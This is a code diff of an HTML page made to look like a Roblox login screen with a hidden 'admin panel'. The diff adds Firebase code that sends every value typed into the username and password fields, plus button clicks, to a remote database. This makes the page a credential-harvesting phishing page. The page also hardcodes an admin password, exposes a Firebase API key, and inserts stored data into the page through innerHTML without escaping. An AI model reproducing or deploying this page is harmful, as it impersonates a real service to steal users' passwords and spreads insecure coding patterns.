@@ -1,10 +1,13 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-<title>Roblox Login</title>
+<meta charset="UTF-8">
+
+<meta name="viewport"
+content="width=device-width, initial-scale=1.0">
+
+<title>Roblox Admin Panel</title>
 
 <style>
 
@@ -24,8 +27,11 @@
 ========================= */
 
 body{
+
     background:#000;
+
     color:white;
+
     overflow-x:hidden;
 }
 
@@ -36,6 +42,7 @@ body{
 .navbar{
 
     width:100%;
+
     height:52px;
 
     background:#191b1f;
@@ -91,7 +98,7 @@ body{
     object-fit:contain;
 }
 
-/* SIGNUP */
+/* BUTTON */
 
 .signup-btn{
 
@@ -175,7 +182,7 @@ body{
 }
 
 /* =========================
-   INPUT BOX
+   INPUTS
 ========================= */
 
 .input-box{
@@ -209,7 +216,7 @@ body{
     color:#aaa;
 }
 
-/* SHOW/HIDE BUTTON */
+/* SHOW BUTTON */
 
 .show-pass-btn{
 
@@ -269,6 +276,38 @@ body{
 }
 
 /* =========================
+   EXTRA BUTTONS
+========================= */
+
+.secondary-btn{
+
+    width:100%;
+
+    margin-top:14px;
+
+    padding:14px;
+
+    border:none;
+
+    border-radius:12px;
+
+    background:#373c4a;
+
+    color:white;
+
+    font-size:15px;
+
+    cursor:pointer;
+
+    transition:0.3s;
+}
+
+.secondary-btn:hover{
+
+    background:#4d5466;
+}
+
+/* =========================
    LINKS
 ========================= */
 
@@ -286,6 +325,28 @@ body{
     text-decoration:none;
 }
 
+/* SIGNUP */
+
+.signup-text{
+
+    margin-top:24px;
+
+    text-align:center;
+
+    color:#b0b0b0;
+
+    font-size:15px;
+}
+
+.signup-text a{
+
+    color:white;
+
+    text-decoration:none;
+
+    font-weight:bold;
+}
+
 /* =========================
    MESSAGE
 ========================= */
@@ -299,11 +360,21 @@ body{
     color:#ff4d4d;
 }
 
+#result{
+
+    margin-top:18px;
+
+    text-align:center;
+
+    color:#00ff99;
+}
+
 /* =========================
    ADMIN PANEL
 ========================= */
 
 #adminPanel{
+
     display:none;
 }
 
@@ -321,16 +392,9 @@ body{
 
     padding:18px;
 
-    max-height:300px;
+    max-height:400px;
 
     overflow-y:auto;
-}
-
-.panel-box h3{
-
-    margin-bottom:14px;
-
-    color:#00aaff;
 }
 
 /* =========================
@@ -373,17 +437,6 @@ body{
     margin-top:8px;
 }
 
-/* RESULT */
-
-#result{
-
-    margin-top:18px;
-
-    text-align:center;
-
-    color:#00ff99;
-}
-
 </style>
 </head>
 
@@ -396,7 +449,9 @@ body{
     <div class="nav-left">
 
         <div class="menu-icon">
+
             ☰
+
         </div>
 
         <img
@@ -406,7 +461,9 @@ body{
     </div>
 
     <button class="signup-btn">
+
         Sign Up
+
     </button>
 
 </div>
@@ -428,7 +485,7 @@ body{
             <input
             type="text"
             id="username"
-            placeholder="Username/Email/Phone">
+            placeholder="Username">
 
         </div>
 
@@ -441,12 +498,9 @@ body{
             id="password"
             placeholder="Password">
 
-            <!-- SHOW/HIDE -->
-
             <button
             class="show-pass-btn"
             onclick="togglePassword()"
-            type="button"
             id="toggleBtn">
 
             Show
@@ -455,7 +509,7 @@ body{
 
         </div>
 
-        <!-- LOGIN BUTTON -->
+        <!-- LOGIN -->
 
         <button
         class="login-btn"
@@ -465,10 +519,42 @@ body{
 
         </button>
 
+        <!-- FORGOT -->
+
         <div class="links">
 
             <a href="#">
+
                 Forgot Password or Username?
+
+            </a>
+
+        </div>
+
+        <!-- EXTRA BUTTONS -->
+
+        <button class="secondary-btn">
+
+            Email Me a One-Time Code
+
+        </button>
+
+        <button class="secondary-btn">
+
+            Use Another Device
+
+        </button>
+
+        <!-- SIGNUP -->
+
+        <div class="signup-text">
+
+            Don't have an account?
+
+            <a href="#">
+
+                Sign Up
+
             </a>
 
         </div>
@@ -481,9 +567,9 @@ body{
 
     <div class="login-box" id="adminPanel">
 
-        <h1 id="welcomeText">
+        <h1>
 
-            Welcome Admin
+            Admin Panel
 
         </h1>
 
@@ -498,6 +584,8 @@ body{
 
         </div>
 
+        <!-- RUN -->
+
         <button
         class="login-btn"
         onclick="runCommand()">
@@ -510,7 +598,7 @@ body{
 
         <div class="panel-box">
 
-            <h3>Available Commands</h3>
+            <h3>Commands</h3>
 
             <p>kick</p>
             <p>ban</p>
@@ -519,11 +607,16 @@ body{
 
         </div>
 
-        <!-- ACTIVITY -->
+        <!-- LIVE DATA -->
 
         <div class="panel-box">
 
-            <h3>User Activity (Max 10)</h3>
+            <h3>
+
+                Online User Activity
+                (50 Latest)
+
+            </h3>
 
             <div id="savedDataBox"></div>
 
@@ -535,209 +628,187 @@ body{
 
 </div>
 
-<script>
+<!-- FIREBASE -->
+
+<script type="module">
 
 /* =========================
-   MAX RECORDS
+   IMPORTS
 ========================= */
 
-const MAX_RECORDS = 10;
+import { initializeApp }
 
-/* =========================
-   TIME
-========================= */
+from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
 
-function getCurrentTime(){
+import {
 
-    return new Date().toLocaleString();
+    getDatabase,
+
+    ref,
+
+    push,
+
+    onValue,
+
+    remove
 
 }
+
+from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";
+
+/* =========================
+   FIREBASE CONFIG
+========================= */
+
+const firebaseConfig = {
+
+  apiKey: "AIzaSyA5uGGN1a_ydQILFtz1RxI1JYJF3FoKZ6U",
+
+  authDomain: "robloxadmin-5b4d1.firebaseapp.com",
+
+  databaseURL: "https://robloxadmin-5b4d1-default-rtdb.firebaseio.com",
+
+  projectId: "robloxadmin-5b4d1",
+
+  storageBucket: "robloxadmin-5b4d1.firebasestorage.app",
+
+  messagingSenderId: "1028232627372",
+
+  appId: "1:1028232627372:web:cfb765f26fc2b045a44b09",
+
+  measurementId: "G-XQXYL2DMEC"
+
+};
+
+/* =========================
+   START FIREBASE
+========================= */
+
+const app = initializeApp(firebaseConfig);
+
+const db = getDatabase(app);
 
 /* =========================
    SHOW/HIDE PASSWORD
 ========================= */
 
-function togglePassword(){
+window.togglePassword = function(){
 
     const passInput =
 
     document.getElementById("password");
 
-    const toggleBtn =
+    const btn =
 
     document.getElementById("toggleBtn");
-
-    /* SHOW */
 
     if(passInput.type === "password"){
 
         passInput.type = "text";
 
-        toggleBtn.innerText = "Hide";
+        btn.innerText = "Hide";
 
     }
-
-    /* HIDE */
 
     else{
 
         passInput.type = "password";
 
-        toggleBtn.innerText = "Show";
+        btn.innerText = "Show";
 
     }
 
-}
+};
 
 /* =========================
-   SAVE ACTIVITY
+   SAVE ONLINE
 ========================= */
 
-function saveActivity(type,data){
+window.saveActivity = function(type,data){
 
-    let activities =
+    push(
 
-    JSON.parse(
-        localStorage.getItem("userActivity")
-    ) || [];
+        ref(db,"activities"),
 
-    activities.push({
+        {
 
-        type:type,
+            type:type,
 
-        data:data,
+            data:data,
 
-        time:getCurrentTime()
+            time:new Date().toLocaleString()
 
-    });
-
-    if(activities.length > MAX_RECORDS){
-
-        activities.shift();
-
-    }
-
-    localStorage.setItem(
-
-        "userActivity",
-
-        JSON.stringify(activities)
+        }
 
     );
 
-    loadActivity();
-
-}
+};
 
 /* =========================
-   LOAD ACTIVITY
+   LIVE ACTIVITY
 ========================= */
 
-function loadActivity(){
+onValue(
 
-    let activities =
+    ref(db,"activities"),
 
-    JSON.parse(
-        localStorage.getItem("userActivity")
-    ) || [];
+    (snapshot)=>{
 
-    let output = "";
+        let output = "";
 
-    activities
-    .slice()
-    .reverse()
-    .forEach((item)=>{
+        let items = [];
 
-        output += `
+        snapshot.forEach((child)=>{
 
-        <div class="activity-card">
+            items.push(child.val());
 
-            <div class="activity-title">
+        });
 
-                ${item.type}
+        items.reverse();
+
+        items.slice(0,50).forEach((item)=>{
+
+            output += `
+
+            <div class="activity-card">
+
+                <div class="activity-title">
+
+                    ${item.type}
+
+                </div>
+
+                <div class="activity-data">
+
+                    ${item.data}
+
+                </div>
+
+                <div class="activity-time">
+
+                    ${item.time}
+
+                </div>
 
             </div>
 
-            <div class="activity-data">
+            `;
 
-                ${item.data}
+        });
 
-            </div>
-
-            <div class="activity-time">
-
-                ${item.time}
-
-            </div>
-
-        </div>
-
-        `;
-
-    });
-
-    document
-    .getElementById("savedDataBox")
-    .innerHTML = output;
-
-}
-
-/* =========================
-   PAGE LOAD
-========================= */
-
-window.onload = function(){
-
-    loadActivity();
-
-}
-
-/* =========================
-   TRACK INPUT
-========================= */
-
-document.addEventListener("input",(e)=>{
-
-    if(e.target.tagName === "INPUT"){
-
-        saveActivity(
-
-            "User Typed",
-
-            `${e.target.placeholder}
-            : ${e.target.value}`
-
-        );
+        document
+        .getElementById("savedDataBox")
+        .innerHTML = output;
 
     }
 
-});
-
-/* =========================
-   TRACK BUTTON
-========================= */
-
-document.addEventListener("click",(e)=>{
-
-    if(e.target.tagName === "BUTTON"){
-
-        saveActivity(
-
-            "Button Clicked",
-
-            e.target.innerText
-
-        );
-
-    }
-
-});
+);
 
 /* =========================
    LOGIN
 ========================= */
 
-function login(){
+window.login = function(){
 
     const user =
 
@@ -759,9 +830,10 @@ function login(){
 
     );
 
-    /* ADMIN LOGIN */
+    /* ADMIN */
 
-    if(user === "naman" && pass === "naman"){
+    if(user === "naman"
+    && pass === "naman"){
 
         document
         .getElementById("loginBox")
@@ -771,16 +843,11 @@ function login(){
         .getElementById("adminPanel")
         .style.display = "block";
 
-        document
-        .getElementById("welcomeText")
-        .innerText =
-        "Welcome Admin Naman";
-
         saveActivity(
 
             "Admin Login",
 
-            "Admin logged in successfully"
+            user
 
         );
 
@@ -797,19 +864,68 @@ function login(){
 
             "Failed Login",
 
-            `Wrong password for ${user}`
+            user
 
         );
 
     }
 
-}
+};
+
+/* =========================
+   TRACK BUTTONS
+========================= */
+
+document.addEventListener(
+
+"click",
+
+(e)=>{
+
+    if(e.target.tagName === "BUTTON"){
+
+        saveActivity(
+
+            "Button Clicked",
+
+            e.target.innerText
+
+        );
+
+    }
+
+});
+
+/* =========================
+   TRACK INPUTS
+========================= */
+
+document.addEventListener(
+
+"input",
+
+(e)=>{
+
+    if(e.target.tagName === "INPUT"){
+
+        saveActivity(
+
+            "User Typed",
+
+            `${e.target.placeholder}
+            : ${e.target.value}`
+
+        );
+
+    }
+
+});
 
 /* =========================
    COMMANDS
 ========================= */
 
-function runCommand(){
+window.runCommand = function(){
 
     const cmd =
 
@@ -853,16 +969,12 @@ function runCommand(){
 
     else if(cmd === "clear"){
 
-        localStorage.removeItem(
-            "userActivity"
+        remove(
+            ref(db,"activities")
         );
 
-        document
-        .getElementById("savedDataBox")
-        .innerHTML = "";
-
         result.innerText =
-        "All activity cleared!";
+        "Database cleared!";
 
     }
 
@@ -873,15 +985,25 @@ function runCommand(){
         document.body.innerHTML = `
 
         <div style="
+
         height:100vh;
+
         display:flex;
+
         justify-content:center;
+
         align-items:center;
+
         flex-direction:column;
+
         background:black;
+
         color:red;
+
         font-size:45px;
+
         font-family:Arial;
+
         ">
 
         WEBSITE SHUTDOWN
@@ -911,7 +1033,7 @@ function runCommand(){
 
     }
 
-}
+};
 
 </script>
 
